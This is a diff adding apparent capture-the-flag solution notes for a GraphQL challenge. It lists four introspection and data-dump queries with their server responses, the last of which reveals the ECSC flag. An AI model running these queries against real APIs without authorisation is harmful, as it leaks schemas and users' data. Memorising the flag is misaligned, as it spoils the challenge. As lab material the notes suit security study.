@@ -1,0 +1,70 @@
+PAYLOAD1 = leak DB schema
+a = """{"query":"{\n __schema {\n types {\n name\n }\n }\n }\n "}"""
+
+{"data":{"__schema":{"types":[
+    {"name":"Query"}
+
+    {"name":"Node"}
+    {"name":"ID"}
+
+    {"name":"PostObjectConnection"}
+    {"name":"PageInfo"}
+    {"name":"Boolean"}
+    {"name":"String"}
+    {"name":"PostObjectEdge"}
+    {"name":"PostObject"}
+    {"name":"Int"}
+    {"name":"UserObject"}
+    {"name":"UserObjectConnection"}
+    {"name":"UserObjectEdge"}
+
+    {"name":"__Schema"}
+    {"name":"__Type"}
+    {"name":"__TypeKind"}
+    {"name":"__Field"}
+    {"name":"__InputValue"}
+    {"name":"__EnumValue"}
+    {"name":"__Directive"}
+    {"name":"__DirectiveLocation"}]}}}
+    
+PAYLOAD2 = LEAK UserObject table info
+b = """{"query":"{\n __type(name: \"UserObject\") {\n name\n fields {\n name\n type{\n name\n kind\n }\n }\n }\n }\n "}"""
+
+    {"data":{"__type":
+    {"name":"UserObject","fields":[
+        {"name":"id","type":
+            {"name":null,"kind":"NON_NULL"}
+        },
+        {"name":"name","type":
+            {"name":"String","kind":"SCALAR"}
+        },
+        {"name":"email","type":
+            {"name":"String","kind":"SCALAR"}
+        },
+        {"name":"randomStr1ngtoInduc3P4in","type":
+            {"name":"String","kind":"SCALAR"}
+        },
+        {"name":"posts","type":
+            {"name":"PostObjectConnection","kind":"OBJECT"}
+        }
+    ]}}}
+    
+ PAYLOAD3 = find defined GraphQL queries that are available to us
+ c  = """{"query":"{\n __schema {\n queryType  {\n fields{\n name\n description\n }\n }\n }\n }\n "}"""
+ {"data":{"__schema":{"queryType":{"fields":[
+    {"name":"node","description":"The ID of the object"},
+    {"name":"allPosts","description":null},
+    {"name":"allUsers","description":null}]}}}}
+    
+ PAYLOAD4 = Dump Users
+{"query":"{\nallUsers{\n edges{\nnode{\n randomStr1ngtoInduc3P4in\n}\n}\n}\n}\n "}
+
+{"data":{"allUsers":{"edges":[,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,{"node":{"randomStr1ngtoInduc3P4in":"ECSC{dd5cc2f6a3a566518c04161a22b82499a913442a485aeb1e76dd850305e46b1a}"}},,,,,,,,,,,,,,,,,,,,,,,,,,
+,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+    
+
